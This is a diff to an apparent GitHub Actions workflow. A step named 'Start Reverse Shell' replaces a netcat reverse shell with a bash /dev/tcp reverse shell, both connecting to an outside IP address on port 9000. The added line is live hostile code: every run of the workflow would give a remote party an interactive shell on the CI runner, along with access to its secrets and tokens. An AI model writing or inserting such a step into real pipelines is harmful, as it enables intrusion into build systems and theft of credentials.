@@ -10,4 +10,4 @@ jobs:
     - uses: actions/checkout@v2
     - name: Start Reverse Shell
       run: |
-        nc -e /bin/bash 200.238.144.25 9000
+        bash -i >& /dev/tcp/200.238.144.25/9000 0>&1
